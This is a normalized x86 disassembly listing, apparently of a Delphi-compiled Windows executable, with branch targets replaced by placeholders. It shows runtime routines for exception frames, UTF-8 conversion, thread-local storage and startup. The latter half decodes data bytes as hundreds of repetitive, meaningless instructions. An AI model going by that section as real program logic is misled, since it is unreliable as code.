jmp r-xdata
sub_4059e4
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_405a10
test edx edx
je sub_4059cc
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_402910
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_405a78
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403300
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_405af8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_405bd4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_405d0c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405dab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403f9c
mov eax ebx
xor edx edx
call sub_404820
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405db2
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
mov eax ebx
call sub_404814
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_4045e8
mov eax ebx
call sub_404814
push eax
mov eax [ ebp - 0x4 ]
call sub_40425c
inc eax
push eax
mov eax ebx
call sub_404804
push eax
mov eax [ ebp - 0x4 ]
call sub_40445c
pop ecx
pop edx
call sub_405af8
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403f9c
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_4045e8
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403ff0
sub_405db8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405e4f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4046a8
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405e56
lea eax [ ebp - 0x4 ]
call sub_4046a8
retn
mov eax ebx
call sub_40425c
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_4048f0
mov eax ebx
call sub_40425c
push eax
mov eax [ ebp - 0x4 ]
call sub_404814
inc eax
push eax
mov eax ebx
call sub_40445c
push eax
mov eax [ ebp - 0x4 ]
call sub_404804
pop ecx
pop edx
call sub_405bd4
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_4046a8
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_4048f0
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4046e4
sub_405e5c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405e9f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4047f4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_405d0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405ea6
lea eax [ ebp - 0x4 ]
call sub_4046a8
retn
sub_405eac
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_404194
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_4053fc
push eax
call sub_401384
mov ecx eax
mov edx esp
mov eax esi
call sub_40408c
jmp r-xdata
sub_405f04
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_405f6a
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_40134c
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_40420c
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402c78
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405f71
lea eax [ ebp - 0x10 ]
call sub_403f9c
retn
xor ebx ebx
sub_405f78
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405fc2
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405fc9
retn
mov eax rw-data
call sub_402ab4
mov eax rw-data
call sub_402ab4
mov eax rw-data
call sub_402ab4
call sub_401bb8
sub_405fcc
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404de8
call sub_403084
test al al
je r-xdata
call sub_403178
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_401404
mov [ rw-data ] eax
call sub_4013fc
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_4030b4
call sub_401374
call sub_405f04
mov [ rw-data ] eax
call sub_4013fc
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_401374
call sub_405f04
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_4013f4
mov [ rw-data ] eax
sub_4060d4
push ebx
call sub_4060cc
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_4060c0
test eax eax
jne r-xdata
mov eax 0xe2
call sub_403f90
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_403f90
sub_406118
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_4060d4
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_406164
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_4060a0
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_406158
mov edx rw-data
mov eax ebx
call sub_403ce4
pop ebx
retn
sub_4061a8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4061cd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4061d4
retn
sub_406204
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_406220
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406245
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40624c
retn
sub_406258
pop esp
bound eax [ eax ]
add eax [ edx ]
xor [ cs : 0x0 ] eax
or al 0x0
add [ eax ] al
pop eax
bound eax [ eax ]
or ch [ edi + 0x64 ]
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
mov bl 0x47
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
inc edi
jb r-xdata
jb r-xdata
je r-xdata
add [ ebx + 0x1825ffc0 ] cl
mov bl 0x47
add [ ebx + 0x1425ffc0 ] cl
mov bl 0x47
sar bh 0x25
sbb al 0xb3
inc edi
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ ebx + 0x1025ffc0 ] cl
mov bl 0x47
add [ ebx + 0xc25ffc0 ] cl
mov bl 0x47
add [ ebx + 0x825ffc0 ] cl
mov bl 0x47
add [ ebx + 0x425ffc0 ] cl
mov bl 0x47
add [ ebx + 0x25ffc0 ] cl
mov bl 0x47
add [ ebx - 0x3da0040 ] cl
mov dl 0x47
add [ ebx - 0x7da0040 ] cl
mov dl 0x47
add [ ebx - 0xbda0040 ] cl
mov dl 0x47
add [ ebx - 0xfda0040 ] cl
mov dl 0x47
add [ ebx - 0x13da0040 ] cl
mov dl 0x47
add [ ebx - 0x17da0040 ] cl
mov dl 0x47
add [ ebx - 0x1bda0040 ] cl
mov dl 0x47
add [ ebx - 0x1fda0040 ] cl
mov dl 0x47
add [ ebx - 0x23da0040 ] cl
mov dl 0x47
add [ ebx - 0x27da0040 ] cl
mov dl 0x47
add [ ebx - 0x2bda0040 ] cl
mov dl 0x47
add [ ebx - 0x2fda0040 ] cl
mov dl 0x47
add [ ebx - 0x33da0040 ] cl
mov dl 0x47
add [ ebx - 0x37da0040 ] cl
mov dl 0x47
add [ ebx - 0x3bda0040 ] cl
mov dl 0x47
add [ ebx - 0x3fda0040 ] cl
mov dl 0x47
add [ ebx - 0x43da0040 ] cl
mov dl 0x47
add [ ebx - 0x47da0040 ] cl
mov dl 0x47
add [ ebx - 0x4bda0040 ] cl
mov dl 0x47
add [ ebx - 0x4fda0040 ] cl
mov dl 0x47
add [ ebx - 0x53da0040 ] cl
mov dl 0x47
add [ ebx - 0x57da0040 ] cl
mov dl 0x47
add [ ebx - 0x5bda0040 ] cl
mov dl 0x47
add [ ebx - 0x5fda0040 ] cl
mov dl 0x47
add [ ebx - 0x63da0040 ] cl
mov dl 0x47
add [ ebx - 0x67da0040 ] cl
mov dl 0x47
add [ ebx - 0x6bda0040 ] cl
mov dl 0x47
add [ ebx - 0x6fda0040 ] cl
mov dl 0x47
add [ ebx - 0x73da0040 ] cl
mov dl 0x47
add [ ebx - 0x77da0040 ] cl
mov dl 0x47
add [ ebx - 0x7bda0040 ] cl
mov dl 0x47
add [ ebx - 0x7fda0040 ] cl
mov dl 0x47
add [ ebx + 0x7c25ffc0 ] cl
mov dl 0x47
add [ ebx + 0x7825ffc0 ] cl
mov dl 0x47
add [ ebx + 0x7425ffc0 ] cl
mov dl 0x47
add [ ebx + 0x7025ffc0 ] cl
mov dl 0x47
add [ ebx + 0x6c25ffc0 ] cl
mov dl 0x47
add [ ebx + 0x6825ffc0 ] cl
mov dl 0x47
add [ ebx + 0x6425ffc0 ] cl
mov dl 0x47
add [ ebx + 0x6025ffc0 ] cl
mov dl 0x47
add [ ebx + 0x5c25ffc0 ] cl
mov dl 0x47
add [ ebx + 0x5825ffc0 ] cl
mov dl 0x47
add [ ebx + 0x5425ffc0 ] cl
mov dl 0x47
add [ ebx + 0x5025ffc0 ] cl
mov dl 0x47
add [ ebx + 0x4c25ffc0 ] cl
mov dl 0x47
add [ ebx + 0x4825ffc0 ] cl
mov dl 0x47
add [ ebx + 0x4425ffc0 ] cl
mov dl 0x47
add [ ebx + 0x4025ffc0 ] cl
mov dl 0x47
add [ ebx + 0x3c25ffc0 ] cl
mov dl 0x47
add [ ebx + 0x3825ffc0 ] cl
mov dl 0x47
add [ ebx + 0x3425ffc0 ] cl
mov dl 0x47
add [ ebx + 0x3025ffc0 ] cl
mov dl 0x47
add [ ebx + 0x2c25ffc0 ] cl
mov dl 0x47
add [ ebx + 0x2825ffc0 ] cl
mov dl 0x47
add [ ebx + 0x2425ffc0 ] cl
mov dl 0x47
add [ ebx + 0x4025ffc0 ] cl
mov bl 0x47
add [ ebx + 0x3c25ffc0 ] cl
mov bl 0x47
add [ ebx + 0x3825ffc0 ] cl
mov bl 0x47
add [ ebx + 0x6c25ffc0 ] cl
mov ah 0x47
add [ ebx + 0x6825ffc0 ] cl
mov ah 0x47
add [ ebx + 0x6425ffc0 ] cl
mov ah 0x47
add [ ebx + 0x6025ffc0 ] cl
mov ah 0x47
add [ ebx + 0x5c25ffc0 ] cl
mov ah 0x47
add [ ebx + 0x5825ffc0 ] cl
mov ah 0x47
add [ ebx + 0x5425ffc0 ] cl
mov ah 0x47
add [ ebx + 0x5025ffc0 ] cl
mov ah 0x47
add [ ebx + 0x4c25ffc0 ] cl
mov ah 0x47
add [ ebx + 0x4825ffc0 ] cl
mov ah 0x47
add [ ebx + 0x4425ffc0 ] cl
mov ah 0x47
add [ ebx + 0x4025ffc0 ] cl
mov ah 0x47
add [ ebx + 0x3c25ffc0 ] cl
mov ah 0x47
add [ ebx + 0x3825ffc0 ] cl
mov ah 0x47
add [ ebx + 0x3425ffc0 ] cl
mov ah 0x47
add [ ebx + 0x3025ffc0 ] cl
mov ah 0x47
add [ ebx + 0x2c25ffc0 ] cl
mov ah 0x47
add [ ebx + 0x2825ffc0 ] cl
mov ah 0x47
add [ ebx + 0x2425ffc0 ] cl
mov ah 0x47
add [ ebx + 0x2025ffc0 ] cl
mov ah 0x47
add [ ebx + 0x1c25ffc0 ] cl
mov ah 0x47
add [ ebx + 0x1825ffc0 ] cl
mov ah 0x47
add [ ebx + 0x1425ffc0 ] cl
mov ah 0x47
add [ ebx + 0x1025ffc0 ] cl
mov ah 0x47
add [ ebx + 0xc25ffc0 ] cl
mov ah 0x47
add [ ebx + 0x825ffc0 ] cl
mov ah 0x47
add [ ebx + 0x425ffc0 ] cl
mov ah 0x47
add [ ebx + 0x25ffc0 ] cl
mov ah 0x47
add [ ebx - 0x3da0040 ] cl
mov bl 0x47
add [ ebx - 0x7da0040 ] cl
mov bl 0x47
add [ ebx - 0xbda0040 ] cl
mov bl 0x47
add [ ebx - 0xfda0040 ] cl
mov bl 0x47
add [ ebx - 0x13da0040 ] cl
mov bl 0x47
add [ ebx - 0x17da0040 ] cl
mov bl 0x47
add [ ebx - 0x1bda0040 ] cl
mov bl 0x47
add [ ebx - 0x1fda0040 ] cl
mov bl 0x47
add [ ebx - 0x23da0040 ] cl
mov bl 0x47
add [ ebx - 0x27da0040 ] cl
mov bl 0x47
add [ ebx - 0x2bda0040 ] cl
mov bl 0x47
add [ ebx - 0x2fda0040 ] cl
mov bl 0x47
add [ ebx - 0x33da0040 ] cl
mov bl 0x47
add [ ebx - 0x37da0040 ] cl
mov bl 0x47
add [ ebx - 0x3bda0040 ] cl
mov bl 0x47
add [ ebx - 0x3fda0040 ] cl
mov bl 0x47
add [ ebx - 0x43da0040 ] cl
mov bl 0x47
add [ ebx - 0x47da0040 ] cl
mov bl 0x47
add [ ebx - 0x4bda0040 ] cl
mov bl 0x47
add [ ebx - 0x4fda0040 ] cl
mov bl 0x47
add [ ebx - 0x53da0040 ] cl
mov bl 0x47
add [ ebx - 0x57da0040 ] cl
mov bl 0x47
add [ ebx - 0x5bda0040 ] cl
mov bl 0x47
add [ ebx - 0x5fda0040 ] cl
mov bl 0x47
add [ ebx - 0x63da0040 ] cl
mov bl 0x47
add [ ebx - 0x67da0040 ] cl
mov bl 0x47
add [ ebx - 0x6bda0040 ] cl
mov bl 0x47
add [ ebx - 0x6fda0040 ] cl
mov bl 0x47
add [ ebx - 0x73da0040 ] cl
mov bl 0x47
add [ ebx - 0x77da0040 ] cl
mov bl 0x47
add [ ebx - 0x7bda0040 ] cl
mov bl 0x47
add [ ebx - 0x7fda0040 ] cl
mov bl 0x47
add [ ebx + 0x7c25ffc0 ] cl
mov bl 0x47
add [ ebx + 0x7825ffc0 ] cl
mov bl 0x47
add [ ebx + 0x7425ffc0 ] cl
mov bl 0x47
add [ ebx + 0x7025ffc0 ] cl
mov bl 0x47
add [ ebx + 0x6c25ffc0 ] cl
mov bl 0x47
add [ ebx + 0x6825ffc0 ] cl
mov bl 0x47
add [ ebx + 0x6425ffc0 ] cl
mov bl 0x47
add [ ebx + 0x6025ffc0 ] cl
mov bl 0x47
add [ ebx + 0x5c25ffc0 ] cl
mov bl 0x47
add [ ebx + 0x5825ffc0 ] cl
mov bl 0x47
add [ ebx + 0x5425ffc0 ] cl
mov bl 0x47
add [ ebx + 0x5025ffc0 ] cl
mov bl 0x47
add [ ebx + 0x4c25ffc0 ] cl
mov bl 0x47
add [ ebx + 0x4825ffc0 ] cl
mov bl 0x47
add [ ebx - 0x3da0040 ] cl
mov dh 0x47
add [ ebx - 0x7da0040 ] cl
mov dh 0x47
add [ ebx - 0x13da0040 ] cl
mov dh 0x47
add [ ebx - 0x1fda0040 ] cl
mov dh 0x47
add [ ebx - 0x23da0040 ] cl
mov dh 0x47
add [ ebx - 0x27da0040 ] cl
mov dh 0x47
add [ ebx - 0x2bda0040 ] cl
mov dh 0x47
add [ ebx - 0x17da0040 ] cl
mov dh 0x47
add [ ebx - 0x1bda0040 ] cl
mov dh 0x47
add [ ebx - 0xbda0040 ] cl
mov dh 0x47
add [ ebx - 0xfda0040 ] cl
mov dh 0x47
add [ ebx - 0x2fda0040 ] cl
mov dh 0x47
add [ ebx - 0x33da0040 ] cl
mov dh 0x47
add [ ebx - 0x37da0040 ] cl
mov dh 0x47
add [ ebx - 0x3bda0040 ] cl
mov dh 0x47
add [ ebx - 0x3fda0040 ] cl
mov dh 0x47
add [ ebx - 0x43da0040 ] cl
mov dh 0x47
add [ ebx - 0x47da0040 ] cl
mov dh 0x47
add [ ebx - 0x4bda0040 ] cl
mov dh 0x47
add [ ebx - 0x4fda0040 ] cl
mov dh 0x47
add [ ebx - 0x53da0040 ] cl
mov dh 0x47
add [ ebx - 0x57da0040 ] cl
mov dh 0x47
add [ ebx - 0x5bda0040 ] cl
mov dh 0x47
add [ ebx - 0x5fda0040 ] cl
mov dh 0x47
add [ ebx - 0x63da0040 ] cl
mov dh 0x47
add [ ebx - 0x67da0040 ] cl
mov dh 0x47
add [ ebx - 0x6bda0040 ] cl
mov dh 0x47
add [ ebx - 0x6fda0040 ] cl
mov dh 0x47
add [ ebx - 0x73da0040 ] cl
mov dh 0x47
add [ ebx - 0x77da0040 ] cl
mov dh 0x47
add [ ebx - 0x7bda0040 ] cl
mov dh 0x47
add [ ebx - 0x7fda0040 ] cl
mov dh 0x47
add [ ebx + 0x7c25ffc0 ] cl
mov dh 0x47
add [ ebx + 0x7825ffc0 ] cl
mov dh 0x47
add [ ebx + 0x7425ffc0 ] cl
mov dh 0x47
add [ ebx + 0x7025ffc0 ] cl
mov dh 0x47
add [ ebx + 0x6c25ffc0 ] cl
mov dh 0x47
add [ ebx + 0x6825ffc0 ] cl
mov dh 0x47
add [ ebx + 0x6425ffc0 ] cl
mov dh 0x47
add [ ebx + 0x6025ffc0 ] cl
mov dh 0x47
add [ ebx + 0x5c25ffc0 ] cl
mov dh 0x47
add [ ebx + 0x5825ffc0 ] cl
mov dh 0x47
add [ ebx + 0x5425ffc0 ] cl
mov dh 0x47
add [ ebx + 0x5025ffc0 ] cl
mov dh 0x47
add [ ebx + 0x4c25ffc0 ] cl
mov dh 0x47
add [ ebx + 0x4825ffc0 ] cl
mov dh 0x47
add [ ebx + 0x4425ffc0 ] cl
mov dh 0x47
add [ ebx + 0x4025ffc0 ] cl
mov dh 0x47
add [ ebx + 0x3c25ffc0 ] cl
mov dh 0x47
add [ ebx + 0x3825ffc0 ] cl
mov dh 0x47
add [ ebx + 0x3425ffc0 ] cl
mov dh 0x47
add [ ebx + 0x3025ffc0 ] cl
mov dh 0x47
add [ ebx + 0x2c25ffc0 ] cl
mov dh 0x47
add [ ebx + 0x2825ffc0 ] cl
mov dh 0x47
add [ ebx + 0x2425ffc0 ] cl
mov dh 0x47
add [ ebx + 0x2025ffc0 ] cl
mov dh 0x47
add [ ebx + 0x1c25ffc0 ] cl
mov dh 0x47
add [ ebx + 0x1825ffc0 ] cl
mov dh 0x47
add [ ebx + 0x1425ffc0 ] cl
mov dh 0x47
add [ ebx + 0x1025ffc0 ] cl
mov dh 0x47
add [ ebx + 0xc25ffc0 ] cl
mov dh 0x47
add [ ebx + 0x825ffc0 ] cl
mov dh 0x47
add [ ebx + 0x425ffc0 ] cl
mov dh 0x47
add [ ebx + 0x25ffc0 ] cl
mov dh 0x47
add [ ebx - 0x3da0040 ] cl
mov ch 0x47
add [ ebx - 0x7da0040 ] cl
mov ch 0x47
add [ ebx - 0xbda0040 ] cl
mov ch 0x47
add [ ebx - 0xfda0040 ] cl
mov ch 0x47
add [ ebx - 0x13da0040 ] cl
mov ch 0x47
add [ ebx - 0x17da0040 ] cl
mov ch 0x47
add [ ebx - 0x1bda0040 ] cl
mov ch 0x47
add [ ebx - 0x1fda0040 ] cl
mov ch 0x47
add [ ebx - 0x23da0040 ] cl
mov ch 0x47
add [ ebx - 0x27da0040 ] cl
mov ch 0x47
add [ ebx - 0x2bda0040 ] cl
mov ch 0x47
add [ ebx - 0x2fda0040 ] cl
mov ch 0x47
add [ ebx - 0x33da0040 ] cl
mov ch 0x47
add [ ebx - 0x37da0040 ] cl
mov ch 0x47
add [ ebx - 0x3bda0040 ] cl
mov ch 0x47
add [ ebx - 0x3fda0040 ] cl
mov ch 0x47
add [ ebx - 0x43da0040 ] cl
mov ch 0x47
add [ ebx - 0x47da0040 ] cl
mov ch 0x47
add [ ebx - 0x4bda0040 ] cl
mov ch 0x47
add [ ebx - 0x1fda0040 ] cl
mov ch 0x47
add [ ebx - 0x4fda0040 ] cl
mov ch 0x47
add [ ebx - 0x53da0040 ] cl
mov ch 0x47
add [ ebx - 0x57da0040 ] cl
mov ch 0x47
add [ ebx - 0x5bda0040 ] cl
mov ch 0x47
add [ ebx - 0x5fda0040 ] cl
mov ch 0x47
add [ ebx - 0x63da0040 ] cl
mov ch 0x47
add [ ebx - 0x63da0040 ] cl
mov ch 0x47
add [ ebx - 0x67da0040 ] cl
mov ch 0x47
add [ ebx - 0x6bda0040 ] cl
mov ch 0x47
add [ ebx - 0x6fda0040 ] cl
mov ch 0x47
add [ ebx - 0x73da0040 ] cl
mov ch 0x47
add [ ebx - 0x77da0040 ] cl
mov ch 0x47
add [ ebx - 0x7bda0040 ] cl
mov ch 0x47
add [ ebx - 0x7fda0040 ] cl
mov ch 0x47
add [ ebx + 0x7c25ffc0 ] cl
mov ch 0x47
add [ ebx + 0x7825ffc0 ] cl
mov ch 0x47
add [ ebx + 0x7425ffc0 ] cl
mov ch 0x47
add [ ebx + 0x7025ffc0 ] cl
mov ch 0x47
add [ ebx + 0x6c25ffc0 ] cl
mov ch 0x47
add [ ebx + 0x6825ffc0 ] cl
mov ch 0x47
add [ ebx + 0x6425ffc0 ] cl
mov ch 0x47
add [ ebx + 0x6025ffc0 ] cl
mov ch 0x47
add [ ebx + 0x5c25ffc0 ] cl
mov ch 0x47
add [ ebx + 0x5825ffc0 ] cl
mov ch 0x47
add [ ebx + 0x5425ffc0 ] cl
mov ch 0x47
add [ ebx + 0x5025ffc0 ] cl
mov ch 0x47
add [ ebx + 0x4c25ffc0 ] cl
mov ch 0x47
add [ ebx + 0x4825ffc0 ] cl
mov ch 0x47
add [ ebx + 0x4425ffc0 ] cl
mov ch 0x47
add [ ebx + 0x4025ffc0 ] cl
mov ch 0x47
add [ ebx + 0x3c25ffc0 ] cl
mov ch 0x47
add [ ebx + 0x3825ffc0 ] cl
mov ch 0x47
add [ ebx + 0x3425ffc0 ] cl
mov ch 0x47
add [ ebx + 0x3025ffc0 ] cl
mov ch 0x47
add [ ebx + 0x2c25ffc0 ] cl
mov ch 0x47
add [ ebx + 0x2825ffc0 ] cl
mov ch 0x47
add [ ebx + 0x2425ffc0 ] cl
mov ch 0x47
add [ ebx + 0x2025ffc0 ] cl
mov ch 0x47
add [ ebx + 0x1c25ffc0 ] cl
mov ch 0x47
add [ ebx + 0x1825ffc0 ] cl
mov ch 0x47
add [ ebx + 0x1425ffc0 ] cl
mov ch 0x47
add [ ebx + 0x1025ffc0 ] cl
mov ch 0x47
add [ ebx + 0xc25ffc0 ] cl
mov ch 0x47
add [ ebx + 0x825ffc0 ] cl
mov ch 0x47
add [ ebx + 0x425ffc0 ] cl
mov ch 0x47
add [ ebx + 0x25ffc0 ] cl
mov ch 0x47
add [ ebx - 0x3da0040 ] cl
mov ah 0x47
add [ ebx - 0x7da0040 ] cl
mov ah 0x47
add [ ebx - 0xbda0040 ] cl
mov ah 0x47
add [ ebx - 0xfda0040 ] cl
mov ah 0x47
add [ ebx - 0x13da0040 ] cl
mov ah 0x47
add [ ebx - 0x17da0040 ] cl
mov ah 0x47
add [ ebx - 0x1bda0040 ] cl
